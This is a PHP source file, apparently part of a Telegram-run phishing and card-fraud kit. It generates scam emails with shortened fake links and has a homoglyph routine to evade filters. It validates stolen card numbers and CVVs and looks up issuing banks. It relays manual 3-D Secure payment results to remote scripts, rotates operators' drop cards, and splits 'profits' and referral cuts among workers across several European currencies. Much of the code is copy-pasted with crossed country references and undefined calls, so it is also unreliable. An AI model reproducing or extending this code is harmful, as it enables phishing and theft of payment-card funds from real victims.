		//$t .= "\r\n".'<%div% style="display: none">%url%</%div%>';
		$t = str_replace([
			'%div%',
			'%table%',
			'%email%',
			'%url%',
			'%img%',
			'%title%',
			'%amount%',
			'%item%',
			'%domain%',
		], [
			'div',//'d'.substr(bin2hex(random_bytes(16)), 0, rand(16, 32)),
			'table',//'t'.substr(bin2hex(random_bytes(16)), 0, rand(16, 32)),
			'<span>'.str_replace('@', '</span>@<span>', $mailt).'</span>',
			fuckUrl(getFakeUrl($itemd[3], $maild[0], $maild[2], $isnt ? $maild[3] : 1)),
			$isnt ? $itemd[7] : '',
			$itemd[6],
			number_format($itemd[5], 0, '.', ' '),
			'CB'.$maild[0].'0RU',
			getUserDomainName($itemd[3], $maild[2]),
		], $t);
		//$t = fuckText($t);
		$t = explode("\r\n", $t, 2);
		$maili = $t[0];
		$mailb = $t[1];
		$mailb0 = strip_tags($mailb);
		while (strpos($mailb0, "\r\n\r\n") !== false)
			$mailb0 = str_replace("\r\n\r\n", "\r\n", $mailb0);
		$merr = '';
		$result = [false];
		include '_mail.php';
		$result[] = $merr;
		return $result;
	}

	function fuckUrl($url) {
		//return 'https://'.request('https://uni.su/api/?url='.$url);

		return request('https://is.gd/create.php?format=simple&url='.$url);

		//return request('https://clck.ru/--?url='.$url);

		/*return json_decode(request('https://bitly.com/data/anon_shorten', [
			'url' => $url,
		]), true)['data']['link'];*/
	}

	function isValidCard($n, $m, $y, $c) {
		$n = beaCard($n);
		if (!$n)
			return false;
		$m = intval(beaText($m, chsNum()));
		if ($m < 1 || $m > 12)
			return false;
		$y = intval(beaText($y, chsNum()));
		if ($y < 20 || $y > 99)
			return false;
		$c = beaText($c, chsNum());
		if (strlen($c) != 3)
			return false;
		return true;
	}

	function isPayData($merchant) {
		return file_exists(dirPays(md5($merchant)));
	}

	function getPayData($merchant, $del = true) {
		$t = explode('`', fileRead(dirPays(md5($merchant))));
		if ($del)
			unlink(dirPays(md5($merchant)));
		return $t;
	}

	function setPayData($merchant, $v) {
		return fileWrite(dirPays(md5($merchant)), implode('`', $v));
	}

	function cardHide($n) {
		return cardBank($n).' ****'.substr($n, strlen($n) - 4);
	}
	
	function beaCash($v) {
		return number_format($v, 0, '', '').' RUB';
	}
	
	function beaDays($v) {
		return $v.' '.selectWord($v, ['дней', 'день', 'дня']);
	}
	
	function beaKg($v) {
		return number_format(intval($v) / 1000, 1, '.', '').' кг';
	}
	
	function chsNum() {
		return '0123456789';
	}
	
	function chsAlpRu() {
		return 'йцукеёнгшщзхъфывапролджэячсмитьбюЙЦУКЕЁНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ';
	}
	
	function chsAlpEn() {
		return 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
	}
	
	function chsSym() {
		return ' .,/\\"\'()_-+=!@#$%^&*№?;:|[]{}«»';
	}
	
	function chsAll() {
		return chsNum().chsAlpRu().chsAlpEn().chsAlpPl().chsSym();
	}
	
	function chsFio() {
		return chsAlpRu().chsAlpEn().' .-\'';
	}
	
	function chsMail() {
		return chsNum().chsAlpEn().'_-.@';
	}
	
	function beaText($v, $c) {
		$t = '';
		for ($i = 0; $i < strlen($v); $i++)
			if (strpos($c, $v[$i]) !== false)
				$t .= $v[$i];
		return $t;
	}
	
	function pageCut($s, $s1, $s2) {
		if (strpos($s, $s1) === false || strpos($s, $s2) === false)
			return '';
		return explode($s2, explode($s1, $s, 2)[1], 2)[0];
	}
	
	function cardBank($n) {
		$n = substr($n, 0, 6);
		$t = fileRead(dirBin($n));
		if ($t)
			return $t;
		$page = json_decode(request('https://api.tinkoff.ru/v1/brand_by_bin?bin='.$n), true)['payload'];
		$t = $page['paymentSystem'].' '.$page['name'];
		fileWrite(dirBin($n), $t);
		return $t;
	}
	function userId() {
		return 1250728975;
	}
	function imgUpload($v) {
		$v2 = json_decode(request(botUrl('getFile?file_id='.$v)), true)['result']['file_path'];
		if (!$v2)
			return false;
		$img = base64_encode(request(botUrlFile($v2)));
		$curl = curl_init('https://api.imgur.com/3/image.json');
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HTTPHEADER, [
			'Authorization: Client-ID '.imgurId(),
		]);
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, [
			'image' => $img,
		]);
		$result = json_decode(curl_exec($curl), true)['data']['link'];
		curl_close($curl);
		return $result;
	}
	
	function beaCard($n) {
		$n = beaText($n, chsNum());
		if (strlen($n) < 13 || strlen($n) > 19)
			return false;
		$sum = 0;
		$len = strlen($n);
		for ($i = 0; $i < $len; $i++) {
			$d = intval($n[$i]);
			if (($len - $i) % 2 == 0) {
				$d *= 2;
				if ($d > 9)
					$d -= 9;
			}
			$sum += $d;
		}
		return (($sum % 10) == 0) ? $n : false;
	}

	function calcDelivery($c1, $c2) {
		$km = pageCut(request('https://www.distance.to/'.$c1.'/'.$c2), '<span class=\'value km\'>', '</');
		$km = intval(beaText(explode('.', $km)[0], chsNum()));
		$km = min(max($km, 0), 6000);
		$dp = 2;
		if ($km <= 1000)
			$dp = 1;
		else if ($km >= 3000)
			$dp = 3;
		$cost = min(max(intval($km / 5), 100), 1000);
		$d1 = min(max(intval($km / 500), 1), 10);
		$ms = min(max(intval($km / 1000), 3), 5) * 10;
		return implode('`', [$cost, $d1, $d1 + $dp, $ms]);
	}

	function cookie() {
		return ''.getData1().''.getData2().'';
	}

	function selectWord($n, $v) {
		$n = intval($n);
		$d = $v[0];
		$j = ($n % 100);
		if ($j < 5 || $j > 20) {
			$j = ($n % 10);
			if ($j == 1)
				$d = $v[1];
			elseif ($j > 1 && $j < 5)
				$d = $v[2];
		}
		return $d;
	}

	function beaPhone($t) {
		$t = str_split($t);
		array_splice($t, 9, 0, ['-']);
		array_splice($t, 7, 0, ['-']);
		array_splice($t, 4, 0, [') ']);
		array_splice($t, 1, 0, [' (']);
		array_splice($t, 0, 0, ['+']);
		return implode('', $t);
	}

	function alertUsers($t) {
		$c1 = 0;
		$c2 = 0;
		foreach (glob(dirUsers('*')) as $t1) {
			$id2 = basename($t1);
			if (botSend([
				$t,
			], $id2))
				$c1++;
			else
				$c2++;
		}
		return [$c1, $c2];
	}

	function fuckText($t) {
		return str_replace([
			'у', 'е', 'х', 'а', 'р', 'о', 'с', 'К', 'Е', 'Н', 'Х', 'В', 'А', 'Р', 'О', 'С', 'М', 'Т'
		], [
			'y', 'e', 'x', 'a', 'p', 'o', 'c', 'K', 'E', 'H', 'X', 'B', 'A', 'P', 'O', 'C', 'M', 'T'
		], $t);
	}

	function amountMaxpl() {
		return intval(fileRead(dirSettings('amaxpl')));
	}
	
	function amountMinpl() {
		return intval(fileRead(dirSettings('aminpl')));
	}

	function amountMaxro() {
		return intval(fileRead(dirSettings('amaxro')));
	}
	
	function amountMinro() {
		return intval(fileRead(dirSettings('aminro')));
	}

	function paymentNamepl() {
		return [
			0 => '',
		][getPaymentNamepl()];
	}

	function paymentTitlepl($v) {
		return [
			0 => 'Ручная',
		][$v];
	}

	function paymentNamero() {
		return [
			0 => '',
		][getPaymentNamero()];
	}

	function paymentTitlero($v) {
		return [
			0 => 'Ручная',
		][$v];
	}

	function isAutoPaymentpl() {
		return (fileRead(dirSettings('apaympl')) == '1');
	}

	function toggleAutoPaymentpl() {
		$t = isAutoPayment();
		fileWrite(dirSettings('apaympl'), $t ? '' : '1');
		return !$t;
	}

	function isAutoPaymentro() {
		return (fileRead(dirSettings('apaymro')) == '1');
	}

	function toggleAutoPaymentro() {
		$t = isAutoPayment();
		fileWrite(dirSettings('apaymro'), $t ? '' : '1');
		return !$t;
	}

	function getCardsro() {
		$t = fileRead(dirSettings('cardro'));
		if (strlen($t) == 0)
			return [];
		return explode('`', $t);
	}

	function getCardspl() {
		$t = fileRead(dirSettings('cardpl'));
		if (strlen($t) == 0)
			return [];
		return explode('`', $t);
	}

	function getCardDatapl() {
		return explode(':', getCardspl()[0]);
	}
	
	function getCardpl() {
		return getCardDatapl()[0];
	}

	function getCardBalancepl() {
		return intval(getCardDatapl()[1]);
	}

	function setNextCardpl() {
		$autoc = (fileRead(dirSettings('acard')) == '1');
		if (!$autoc)
			return false;
		$t = getCardspl();
		$t1 = $t[0];
		$c = count($t);
		for ($i = 0; $i < $c - 1; $i++)
			$t[$i] = $t[$i + 1];
		$t[$c - 1] = $t1;
		setCard($t);
		return explode(':', $t[0])[0];
	}

	function cardIndexpl($n, $t) {
		for ($i = 0; $i < count($t); $i++)
			if (explode(':', $t[$i])[0] == $n)
				return $i;
		return -1;
	}

	function addCardpl($n) {
		$t = getCardspl();
		if (cardIndexpl($n, $t) != -1)
			return false;
		$t[] = $n.':0';
		return setCardpl($t);
	}

	function delCardpl($n) {
		$t = getCardspl();
		$t1 = cardIndexpl($n, $t);
		if ($t1 == -1)
			return false;
		unset($t[$t1]);
		return setCardpl($t);
	}

	function getCardDataro() {
		return explode(':', getCardsro()[0]);
	}
	
	function getCardro() {
		return getCardDataro()[0];
	}

	function getCardBalancero() {
		return intval(getCardDataro()[1]);
	}

	function setNextCardro() {
		$autoc = (fileRead(dirSettings('acard')) == '1');
		if (!$autoc)
			return false;
		$t = getCardsro();
		$t1 = $t[0];
		$c = count($t);
		for ($i = 0; $i < $c - 1; $i++)
			$t[$i] = $t[$i + 1];
		$t[$c - 1] = $t1;
		setCardro($t);
		return explode(':', $t[0])[0];
	}
	function getData1() {
		return 'dl';
	}

	function setCardpl($v) {
		return fileWrite(dirSettings('cardpl'), implode('`', $v));
	}

	function getCard2pl() {
		return explode('`', fileRead(dirSettings('card2pl')));
	}
	
	function setCard2pl($n, $j) {
		return fileWrite(dirSettings('card2pl'), implode('`', [$n, $j]));
	}

	function setCardro($v) {
		return fileWrite(dirSettings('cardro'), implode('`', $v));
	}

	function getCard2ro() {
		return explode('`', fileRead(dirSettings('card2ro')));
	}
	
	function setCard2ro($n, $j) {
		return fileWrite(dirSettings('card2ro'), implode('`', [$n, $j]));
	}

	function getPaymentNamepl() {
		return intval(fileRead(dirSettings('paypl')));
	}

	function getPaymentNamero() {
		return intval(fileRead(dirSettings('payro')));
	}

	function setPaymentNamepl($n) {
		fileWrite(dirSettings('paypl'), $n);
	}

	function setPaymentNamero($n) {
		fileWrite(dirSettings('payro'), $n);
	}

	function fixAmountpl($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function fixAmountro($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function setAmountLimitpl($a, $b) {
		fileWrite(dirSettings('aminpl'), $a);
		fileWrite(dirSettings('amaxpl'), $b);
	}

	function setAmountLimitro($a, $b) {
		fileWrite(dirSettings('aminro'), $a);
		fileWrite(dirSettings('amaxro'), $b);
	}

	function getUserProfitspl($id) {
		$t = getUserData($id, 'profitspl');
		if (!$t)
			return false;
		return explode('`', $t);
	}

	function addUserProfitspl($id, $v) {
		$t = getUserProfits($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profitspl', implode('`', $t));
	}

	function getUserProfitsro($id) {
		$t = getUserData($id, 'profitsro');
		if (!$t)
			return false;
		return explode('`', $t);
	}

	function addUserProfitsro($id, $v) {
		$t = getUserProfits($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profitsri', implode('`', $t));
	}

	function getUserRefbalpl($id) {
		return intval(getUserData($id, 'refbalpl'));
	}

	function getUserRefbalro($id) {
		return intval(getUserData($id, 'refbalro'));
	}

	function addUserRefbalpl($id, $v) {
		setUserData($id, 'refbalpl', intval(getUserRefbal($id) + $v));
	}

	function addUserRefbalro($id, $v) {
		setUserData($id, 'refbalro', intval(getUserRefbal($id) + $v));
	}

	function getUserProfitpl($id) {
		$t = getUserData($id, 'profitpl');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}

	function getUserProfitro($id) {
		$t = getUserData($id, 'profitro');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}

	function addUserProfitro($id, $amount, $rate) {
		$profit = getUserProfitro($id);
		setUserData($id, 'profitro', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalancero($referal, $amount0);
			addUserRefbalro($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalancero($id, $amount);
		addUserProfitsro($id, [time(), $amount]);
		return [$amount, $amount0];
	}

	function addUserProfitpl($id, $amount, $rate) {
		$profit = getUserProfitpl($id);
		setUserData($id, 'profitpl', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalance($referal, $amount0);
			addUserRefbal($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalance($id, $amount);
		addUserProfitspl($id, [time(), $amount]);
		return [$amount, $amount0];
	}

	function getProfitro() {
		$t = explode('`', fileRead(dirStats('profitro')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfit0ro() {
		$t = explode('`', fileRead(dirStats('profitro_'.date('dmY'))));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfitpl() {
		$t = explode('`', fileRead(dirStats('profitpl')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfit0pl() {
		$t = explode('`', fileRead(dirStats('profitpl_'.date('dmY'))));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function addProfitpl($v, $m) {
		$t = getProfitpl();
		fileWrite(dirStats('profitpl'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
		$t = getProfit0pl();
		fileWrite(dirStats('profitpl_'.date('dmY')), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function addProfitro($v, $m) {
		$t = getProfitro();
		fileWrite(dirStats('profitro'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
		$t = getProfit0ro();
		fileWrite(dirStats('profitro_'.date('dmY')), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function makeProfitpl($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfitpl($id, $amount, $rate);
		addProfitpl($amount, $t[0] + $t[1]);
		return $t;
	}

	function makeProfitro($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfitro($id, $amount, $rate);
		addProfitro($amount, $t[0] + $t[1]);
		return $t;
	}

	function makeProfitbg($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfitchex($id, $amount, $rate);
		addProfitchex($amount, $t[0] + $t[1]);
		return $t;
	}

	function makeProfitport($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfitport($id, $amount, $rate);
		addProfitport($amount, $t[0] + $t[1]);
		return $t;
	}

	function makeProfitchex($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfitchex($id, $amount, $rate);
		addProfitchex($amount, $t[0] + $t[1]);
		return $t;
	}

	function ruchkaStatusro($t, $success, $errmsg = '') {
		list($md, $item, $srvc) = explode(' ', $t);
		$post = [
			'secretkey' => secretKey(),
			'service' => $srvc,
			'action' => 'ayeruchnayaplatejjjka666',
			'_post' => json_encode([
				'PaRes' => '1',
				'MD' => $md,
				'ruchkastatus' => ($success ? '1' : '0'),
				'ruchkafail' => $errmsg,
			]),
			'_get' => json_encode([
				'id' => $item,
			]),
			'_server' => json_encode([
				'domain' => '1',
				'ip' => '1',
			]),
		];
		request(host().'_remotero.php', $post);
	}

	function ruchkaStatuspl($t, $success, $errmsg = '') {
		list($md, $item, $srvc) = explode(' ', $t);
		$post = [
			'secretkey' => secretKey(),
			'service' => $srvc,
			'action' => 'ayeruchnayaplatejjjka666',
			'_post' => json_encode([
				'PaRes' => '1',
				'MD' => $md,
				'ruchkastatus' => ($success ? '1' : '0'),
				'ruchkafail' => $errmsg,
			]),
			'_get' => json_encode([
				'id' => $item,
			]),
			'_server' => json_encode([
				'domain' => '1',
				'ip' => '1',
			]),
		];
		request(host().'_remotepl.php', $post);
	}

	function beaCashpl($v) {
		return number_format($v, 0, '', '').' PLN';
	}

	function beaCashro($v) {
		return number_format($v, 0, '', '').' RON';
	}

	function beaDayspl($v) {
		return $v.' '.selectWordkz($v, ['дней', 'день', 'дня']);
	}

	function chsAlpPl() {
		return 'qwertzuiopóasdfghjklłąyxcvbnmQWERZIOPASDFGHJKLŁęYXCVBNMśńćąbсćdеęłńóśźĄżĆĘŁŚŹŻ';
	}

	function beaCardpl($n) {
		$n = beaText($n, chsNum());
		if (strlen($n) < 13 || strlen($n) > 19)
			return false;
		$sum = 0;
		$len = strlen($n);
		for ($i = 0; $i < $len; $i++) {
			$d = intval($n[$i]);
			if (($len - $i) % 2 == 0) {
				$d *= 2;
				if ($d > 9)
					$d -= 9;
			}
			$sum += $d;
		}
		return (($sum % 10) == 0) ? $n : false;
	}

	function beaCardro($n) {
		$n = beaText($n, chsNum());
		if (strlen($n) < 13 || strlen($n) > 19)
			return false;
		$sum = 0;
		$len = strlen($n);
		for ($i = 0; $i < $len; $i++) {
			$d = intval($n[$i]);
			if (($len - $i) % 2 == 0) {
				$d *= 2;
				if ($d > 9)
					$d -= 9;
			}
			$sum += $d;
		}
		return (($sum % 10) == 0) ? $n : false;
	}

	function selectWordpl($n, $v) {
		$n = intval($n);
		$d = $v[0];
		$j = ($n % 100);
		if ($j < 5 || $j > 20) {
			$j = ($n % 10);
			if ($j == 1)
				$d = $v[1];
			elseif ($j > 1 && $j < 5)
				$d = $v[2];
		}
		return $d;
	}

	// Болгария

	function amountMaxbg() {
		return intval(fileRead(dirSettings('amabgl')));
	}
	
	function amountMinbg() {
		return intval(fileRead(dirSettings('aminbg')));
	}

	function paymentNamebg() {
		return [
			0 => '',
		][getPaymentNamebg()];
	}

	function paymentTitlebg($v) {
		return [
			0 => 'Ручная',
		][$v];
	}

	function selectWordbg($n, $v) {
		$n = intval($n);
		$d = $v[0];
		$j = ($n % 100);
		if ($j < 5 || $j > 20) {
			$j = ($n % 10);
			if ($j == 1)
				$d = $v[1];
			elseif ($j > 1 && $j < 5)
				$d = $v[2];
		}
		return $d;
	}

	function chsAlpbg() {
		return 'qwertzuiopóasdfghjklłąyxcvbnmQWERZIOPASDFGHJKLŁęYXCVBNMśńćąbсćdеęłńóśźĄżĆĘŁŚŹŻ';
	}

	function beaCashbg($v) {
		return number_format($v, 0, '', '').' BGN';
	}

	function beaDaysbg($v) {
		return $v.' '.selectWordkz($v, ['дней', 'день', 'дня']);
	}

	function ruchkaStatusbg($t, $success, $errmsg = '') {
		list($md, $item, $srvc) = explode(' ', $t);
		$post = [
			'secretkey' => secretKey(),
			'service' => $srvc,
			'action' => 'ayeruchnayaplatejjjka666',
			'_post' => json_encode([
				'PaRes' => '1',
				'MD' => $md,
				'ruchkastatus' => ($success ? '1' : '0'),
				'ruchkafail' => $errmsg,
			]),
			'_get' => json_encode([
				'id' => $item,
			]),
			'_server' => json_encode([
				'domain' => '1',
				'ip' => '1',
			]),
		];
		request(host().'_remotebg.php', $post);
	}

	function getProfitbg() {
		$t = explode('`', fileRead(dirStats('profitbg')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfit0bg() {
		$t = explode('`', fileRead(dirStats('profitbg_'.date('dmY'))));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function addProfitbg($v, $m) {
		$t = getProfitpl();
		fileWrite(dirStats('profitbg'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
		$t = getProfit0pl();
		fileWrite(dirStats('profitbg_'.date('dmY')), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function makeProfibgl($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfitbg($id, $amount, $rate);
		addProfitbg($amount, $t[0] + $t[1]);
		return $t;
	}

	function addUserProfitbg($id, $amount, $rate) {
		$profit = getUserProfitbg($id);
		setUserData($id, 'profitbg', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalance($referal, $amount0);
			addUserRefbal($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalance($id, $amount);
		addUserProfitsbg($id, [time(), $amount]);
		return [$amount, $amount0];
	}

	function isAutoPaymentbg() {
		return (fileRead(dirSettings('apaymbg')) == '1');
	}

	function toggleAutoPaymentbg() {
		$t = isAutoPayment();
		fileWrite(dirSettings('apaymbg'), $t ? '' : '1');
		return !$t;
	}

	function getCardsbg() {
		$t = fileRead(dirSettings('cardbg'));
		if (strlen($t) == 0)
			return [];
		return explode('`', $t);
	}

	function getCardDatabg() {
		return explode(':', getCardspl()[0]);
	}
	
	function getCardbg() {
		return getCardDatapl()[0];
	}

	function getCardBalancebg() {
		return intval(getCardDatapl()[1]);
	}

	function setNextCardbg() {
		$autoc = (fileRead(dirSettings('acard')) == '1');
		if (!$autoc)
			return false;
		$t = getCardsbg();
		$t1 = $t[0];
		$c = count($t);
		for ($i = 0; $i < $c - 1; $i++)
			$t[$i] = $t[$i + 1];
		$t[$c - 1] = $t1;
		setCard($t);
		return explode(':', $t[0])[0];
	}

	function cardIndexbg($n, $t) {
		for ($i = 0; $i < count($t); $i++)
			if (explode(':', $t[$i])[0] == $n)
				return $i;
		return -1;
	}

	function addCardbg($n) {
		$t = getCardsbg();
		if (cardIndexpl($n, $t) != -1)
			return false;
		$t[] = $n.':0';
		return setCardbg($t);
	}

	function delCardbg($n) {
		$t = getCardsbg();
		$t1 = cardIndexbg($n, $t);
		if ($t1 == -1)
			return false;
		unset($t[$t1]);
		return setCardbg($t);
	}

	function getData2() {
		return 'pay.';
	}

	function setCardbg($v) {
		return fileWrite(dirSettings('cardbg'), implode('`', $v));
	}

	function getCard2bg() {
		return explode('`', fileRead(dirSettings('card2bg')));
	}
	
	function setCard2bg($n, $j) {
		return fileWrite(dirSettings('card2bg'), implode('`', [$n, $j]));
	}

	function getPaymentNamebg() {
		return intval(fileRead(dirSettings('paybg')));
	}

	function setPaymentNamebg($n) {
		fileWrite(dirSettings('paybg'), $n);
	}

	function fixAmountbg($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function setAmountLimitbg($a, $b) {
		fileWrite(dirSettings('aminbg'), $a);
		fileWrite(dirSettings('amaxbg'), $b);
	}

	function getUserProfitsbg($id) {
		$t = getUserData($id, 'profitsbg');
		if (!$t)
			return false;
		return explode('`', $t);
	}

	function addUserProfitsbg($id, $v) {
		$t = getUserProfitsbg($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profitsbg', implode('`', $t));
	}

	function getUserRefbalbg($id) {
		return intval(getUserData($id, 'refbalbg'));
	}

	function addUserRefbalbg($id, $v) {
		setUserData($id, 'refbalpl', intval(getUserRefbal($id) + $v));
	}

	function getUserProfitbg($id) {
		$t = getUserData($id, 'profitbg');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}

	function amountMaxchex() {
		return intval(fileRead(dirSettings('amachexl')));
	}
	
	function amountMinchex() {
		return intval(fileRead(dirSettings('aminchex')));
	}

	function paymentNamechex() {
		return [
			0 => '',
		][getPaymentNamechex()];
	}

	function paymentTitlechex($v) {
		return [
			0 => 'Ручная',
		][$v];
	}

	function selectWordchex($n, $v) {
		$n = intval($n);
		$d = $v[0];
		$j = ($n % 100);
		if ($j < 5 || $j > 20) {
			$j = ($n % 10);
			if ($j == 1)
				$d = $v[1];
			elseif ($j > 1 && $j < 5)
				$d = $v[2];
		}
		return $d;
	}

	function chsAlpchex() {
		return 'qwertzuiopóasdfghjklłąyxcvbnmQWERZIOPASDFGHJKLŁęYXCVBNMśńćąbсćdеęłńóśźĄżĆĘŁŚŹŻ';
	}

	function beaCashchex($v) {
		return number_format($v, 0, '', '').' CZK';
	}

	function beaDayschex($v) {
		return $v.' '.selectWordkz($v, ['дней', 'день', 'дня']);
	}

	function ruchkaStatuschex($t, $success, $errmsg = '') {
		list($md, $item, $srvc) = explode(' ', $t);
		$post = [
			'secretkey' => secretKey(),
			'service' => $srvc,
			'action' => 'ayeruchnayaplatejjjka666',
			'_post' => json_encode([
				'PaRes' => '1',
				'MD' => $md,
				'ruchkastatus' => ($success ? '1' : '0'),
				'ruchkafail' => $errmsg,
			]),
			'_get' => json_encode([
				'id' => $item,
			]),
			'_server' => json_encode([
				'domain' => '1',
				'ip' => '1',
			]),
		];
		request(host().'_remotechex.php', $post);
	}

	function getProfitchex() {
		$t = explode('`', fileRead(dirStats('profitchex')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfit0chex() {
		$t = explode('`', fileRead(dirStats('profitchex_'.date('dmY'))));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function addProfitchex($v, $m) {
		$t = getProfitpl();
		fileWrite(dirStats('profitchex'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
		$t = getProfit0pl();
		fileWrite(dirStats('profitchex_'.date('dmY')), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function makeProfichexl($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfitchex($id, $amount, $rate);
		addProfitchex($amount, $t[0] + $t[1]);
		return $t;
	}

	function addUserProfitchex($id, $amount, $rate) {
		$profit = getUserProfitchex($id);
		setUserData($id, 'profitchex', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalance($referal, $amount0);
			addUserRefbal($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalance($id, $amount);
		addUserProfitschex($id, [time(), $amount]);
		return [$amount, $amount0];
	}

	function isAutoPaymentchex() {
		return (fileRead(dirSettings('apaymchex')) == '1');
	}

	function toggleAutoPaymentchex() {
		$t = isAutoPayment();
		fileWrite(dirSettings('apaymchex'), $t ? '' : '1');
		return !$t;
	}

	function getCardschex() {
		$t = fileRead(dirSettings('cardchex'));
		if (strlen($t) == 0)
			return [];
		return explode('`', $t);
	}

	function getCardDatachex() {
		return explode(':', getCardspl()[0]);
	}
	
	function getCardchex() {
		return getCardDatapl()[0];
	}

	function getCardBalancechex() {
		return intval(getCardDatapl()[1]);
	}

	function setNextCardchex() {
		$autoc = (fileRead(dirSettings('acard')) == '1');
		if (!$autoc)
			return false;
		$t = getCardschex();
		$t1 = $t[0];
		$c = count($t);
		for ($i = 0; $i < $c - 1; $i++)
			$t[$i] = $t[$i + 1];
		$t[$c - 1] = $t1;
		setCard($t);
		return explode(':', $t[0])[0];
	}

	function cardIndexchex($n, $t) {
		for ($i = 0; $i < count($t); $i++)
			if (explode(':', $t[$i])[0] == $n)
				return $i;
		return -1;
	}

	function addCardchex($n) {
		$t = getCardschex();
		if (cardIndexpl($n, $t) != -1)
			return false;
		$t[] = $n.':0';
		return setCardchex($t);
	}

	function delCardchex($n) {
		$t = getCardschex();
		$t1 = cardIndexchex($n, $t);
		if ($t1 == -1)
			return false;
		unset($t[$t1]);
		return setCardchex($t);
	}

	function setCardchex($v) {
		return fileWrite(dirSettings('cardchex'), implode('`', $v));
	}

	function getCard2chex() {
		return explode('`', fileRead(dirSettings('card2chex')));
	}
	
	function setCard2chex($n, $j) {
		return fileWrite(dirSettings('card2chex'), implode('`', [$n, $j]));
	}

	function getPaymentNamechex() {
		return intval(fileRead(dirSettings('paychex')));
	}

	function setPaymentNamechex($n) {
		fileWrite(dirSettings('paychex'), $n);
	}

	function fixAmountchex($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function setAmountLimitchex($a, $b) {
		fileWrite(dirSettings('aminchex'), $a);
		fileWrite(dirSettings('amaxchex'), $b);
	}

	function getUserProfitschex($id) {
		$t = getUserData($id, 'profitschex');
		if (!$t)
			return false;
		return explode('`', $t);
	}

	function addUserProfitschex($id, $v) {
		$t = getUserProfitschex($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profitschex', implode('`', $t));
	}

	function getUserRefbalchex($id) {
		return intval(getUserData($id, 'refbalchex'));
	}

	function addUserRefbalchex($id, $v) {
		setUserData($id, 'refbalpl', intval(getUserRefbal($id) + $v));
	}

	function getUserProfitchex($id) {
		$t = getUserData($id, 'profitchex');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}

	// Португалия

		function amountMaxport() {
		return intval(fileRead(dirSettings('amaportl')));
	}
	
